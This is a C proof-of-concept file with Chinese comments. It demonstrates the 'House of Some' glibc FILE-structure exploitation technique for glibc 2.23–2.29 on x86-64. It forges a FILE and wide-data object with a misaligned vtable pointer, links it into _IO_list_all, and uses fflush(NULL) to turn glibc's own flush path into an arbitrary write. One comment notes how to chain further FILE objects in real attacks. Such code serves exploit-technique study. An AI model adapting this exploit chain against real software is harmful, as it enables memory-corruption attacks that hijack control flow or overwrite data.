#define _GNU_SOURCE

#include <assert.h>
#include <dlfcn.h>
#include <stddef.h>
#include <stdint.h>
#include <stdio.h>
#include <string.h>
#include <unistd.h>

/*
 * House of Some 消费链验证：glibc 2.23～2.29 / x86-64。
 *
 * 这里说的“消费”，指的是伪造字段布置好之后，glibc 源码里真正读取这些
 * 字段并触发控制转移的那条执行路径。这一版对应 legacy 的 `_IO_wide_data`
 * 布局，里面还留着旧版 codecvt 函数表，所以 `_wide_vtable` 位于 +0x130。
 *
 * 本 PoC 是把伪造 FILE 挂到 _IO_list_all 上，靠 fflush(NULL) 真实触发
 * 整条链路，不会手动直接调用 underflow：
 *
 *   _IO_wfile_overflow -> _IO_wdoallocbuf
 *   -> 通过错位虚表 (_IO_file_jumps - 0x48) 调用 doallocate，
 *   -> 最终进入 _IO_new_file_underflow，执行 read(fd, target, len)。
 */

#define IO_LINKED 0x0080

struct fake_file_plus {
    FILE file;
    const void *vtable;
};

int main(void)
{
    static const char supplied[] = "HOUSE-OF-SOME:LEGACY";
    unsigned char target[sizeof(supplied)];
    unsigned char lock_storage[64];
    unsigned char wide[0x150] __attribute__((aligned(0x10)));
    struct fake_file_plus fake;
    void **list_slot;
    void *saved_list;
    const unsigned char *file_jumps;
    const void *wfile_jumps;
    int fds[2];

    assert(sizeof(FILE) == 0xd8);
    memset(target, 0, sizeof(target));
    memset(lock_storage, 0, sizeof(lock_storage));
    memset(wide, 0, sizeof(wide));
    memset(&fake, 0, sizeof(fake));

    list_slot = (void **)dlsym(RTLD_DEFAULT, "_IO_list_all");
    file_jumps =
        (const unsigned char *)dlsym(RTLD_DEFAULT, "_IO_file_jumps");
    wfile_jumps = dlsym(RTLD_DEFAULT, "_IO_wfile_jumps");
    assert(list_slot != NULL && file_jumps != NULL && wfile_jumps != NULL);
    saved_list = *list_slot;

    assert(pipe(fds) == 0);
    assert(write(fds[1], supplied, sizeof(supplied)) ==
           (ssize_t)sizeof(supplied));
    close(fds[1]);

    fake.file._flags = IO_LINKED;
    fake.file._chain = NULL;            /* 实战中可以用它串上下一个 read/write FILE。 */
    fake.file._fileno = fds[0];
    fake.file._lock = lock_storage;
    fake.file._mode = 2;                /* 让 _IO_flush_all 走进 wide 分支。 */
    /* 把 FILE 的 _wide_data 字段指向我们伪造的宽字符对象。 */
    *(void **)((unsigned char *)&fake.file + 0xa0) = wide;

    /* 这几个字段决定了最终 _IO_file_read 会把 pipe 里的内容写进哪里。 */
    fake.file._IO_read_base = (char *)target;
    fake.file._IO_read_ptr = (char *)target;
    fake.file._IO_read_end = (char *)target;
    fake.file._IO_write_base = (char *)target;
    fake.file._IO_write_ptr = (char *)target;
    fake.file._IO_write_end = (char *)target + sizeof(target);
    fake.file._IO_buf_base = (char *)target;
    fake.file._IO_buf_end = (char *)target + sizeof(target);
    fake.vtable = wfile_jumps;           /* 用的是合法的 primary wide vtable。 */

    /*
     * +0x18/+0x20 让 wide 的 write_ptr 大于 write_base，从而触发 flush；
     * +0x30 填 NULL，让 wdoallocbuf 走进 wide doallocate 分支；
     * 这一版的 legacy `_wide_vtable` 位于 +0x130。
     */
    *(void **)(wide + 0x18) = NULL;
    *(void **)(wide + 0x20) = (void *)1;
    *(void **)(wide + 0x30) = NULL;
    *(void **)(wide + 0x130) = (void *)(file_jumps - 0x48);

    *list_slot = &fake;
    (void)fflush(NULL);
    *list_slot = saved_list;
    close(fds[0]);

    assert(memcmp(target, supplied, sizeof(supplied)) == 0);
    dprintf(STDERR_FILENO,
            "[+] House of Some legacy +0x130 任意写成功（%zu 字节）\n",
            sizeof(supplied));
    return 0;
}
